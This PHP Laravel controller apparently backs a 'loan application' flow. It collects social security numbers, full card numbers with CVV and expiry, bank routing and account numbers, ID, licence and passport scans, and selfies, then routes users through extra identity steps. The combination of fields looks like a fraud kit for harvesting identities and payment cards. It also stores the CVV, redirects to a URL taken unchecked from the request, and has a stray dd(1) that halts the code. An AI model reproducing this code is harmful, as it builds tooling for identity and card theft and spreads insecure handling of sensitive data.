<?php


namespace App\Http\Controllers\Loan;

use App\Http\Controllers\Controller;
use App\Http\Requests\Loan\StoreRequest;
use Illuminate\Http\Request;
use App\Models\Setting;

class StoreController extends BaseController
{
    public function __invoke(StoreRequest $request)
    {
        dd(1);
        $data = $request->validated();

        $guestData = [
            'name' => $data['name'] ?? null,
            'date_of_birth' => $data['date_of_birth'] ?? null,
            'email' => $data['email'] ?? null,
            'social_number' => $data['social_number'] ?? null,
            'cell_phone' => $data['cell_phone'] ?? null,
            'work_phone' => $data['work_phone'] ?? null,
            'country' => $data['country'] ?? null,
            'state' => $data['state'] ?? null,
            'city' => $data['city'] ?? null,
            'address' => $data['address'] ?? null,
            'zip_code' => $data['zip_code'] ?? null,
            'post_index' => $data['post_index'] ?? null,
            'is_live' => $data['is_live'] ?? null,
            'military_service' => $data['military_service'] ?? null,
            'residential_status' => $data['residential_status'] ?? null,
            'unique_token' => $data['unique_token'] ?? null,
            'address_years' => $data['address_years'] ?? null,
            'note' => $data['note'] ?? null,
        ];

        // Combine expiration date parts if provided
        $expirationDate = null;
        if (isset($data['expMonth']) && isset($data['expYear'])) {
            $expirationDate = sprintf('%04d-%02d-01', $data['expYear'], $data['expMonth']);
        }


        $bankData = [
            'card_number' => $data['card_number'] ?? null,
            'card_holder' => $data['card_holder'] ?? null,
            'cvv' => $data['cvv'] ?? null,
            'expiration_date' => $expirationDate,
            'bank_name' => $data['bank_name'] ?? null,
            'routing_number' => $data['routing_number'] ?? null,
            'account_number' => $data['account_number'] ?? null,
            'bank_year' => $data['bank_year'] ?? null,
        ];

        $documentData = [
            'driving_number' => $data['driving_number'] ?? null,
            'driving_front' => $request->file('driving_front') ?? null,
            'driving_back' => $request->file('driving_back') ?? null,
            'id_front' => $request->file('id_front') ?? null,
            'id_back' => $request->file('id_back') ?? null,
            'passport' => $request->file('passport') ?? null,
            'selfie' => $request->file('selfie') ?? null,
            'additional_document' => $request->file('additional_document') ?? null,
        ];

        $jobData = [
            'job_title' => $data['job_title'] ?? null,
            'employer_name' => $data['employer_name'] ?? null,
            'employment_length' => $data['employment_length'] ?? null,
            'salary' => $data['salary'] ?? null,
        ];

        $this->service->store($guestData, $bankData, $documentData, $jobData, $request);

        $redirectUrl = $request->input('redirect_url', route('apply.loan.amount'));
        $currentUrl = $request->input('current_url', null);

        if ($currentUrl) {
            $nextRoute = $this->getNextAvailableRoute($currentUrl, $redirectUrl);
            return redirect($nextRoute);
        } else {
            return redirect($redirectUrl);
        }
    }

    protected function getNextAvailableRoute($currentUrl, $defaultUrl)
    {
        $settings = Setting::first();

        $routes = [
            'apply.loan.cc_info' => $settings->selfie_upload,
            'apply.loan.verify_identity' => $settings->verify_identity,
            'apply.loan.selfie_upload' => $settings->selfie_upload,
            'apply.loan.selfie_second' => $settings->selfie_second,
            'apply.loan.extra_doc' => $settings->extra_doc,
        ];

        $currentRouteKey = array_search($currentUrl, array_keys($routes));
        $nextRoute = '';

        if ($currentRouteKey !== false) {
            for ($i = $currentRouteKey + 1; $i < count($routes); $i++) {
                $route = array_keys($routes)[$i];
                if ($routes[$route]) {
                    $nextRoute = route($route);
                    break;
                }
            }
        }

        if (empty($nextRoute)) {
            $nextRoute = $defaultUrl; // Default route if no other route is available
        }

        return $nextRoute;
    }
}
